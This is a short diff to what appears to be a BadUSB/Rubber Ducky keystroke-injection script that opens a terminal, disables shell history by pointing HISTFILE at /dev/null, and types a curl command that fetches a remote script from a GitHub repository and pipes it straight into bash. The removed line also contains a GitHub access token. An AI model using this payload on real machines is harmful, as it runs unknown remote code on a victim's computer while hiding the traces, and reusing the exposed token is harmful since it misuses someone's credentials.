@@ -3,7 +3,7 @@ CTRL ALT t
 DELAY 500
 STRING export HISTFILE=/dev/null
 ENTER
-STRING  curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock/master/script.sh" | bash
+STRING  curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/script.sh" | bash
 ENTER
 DELAY 500
 STRING exit
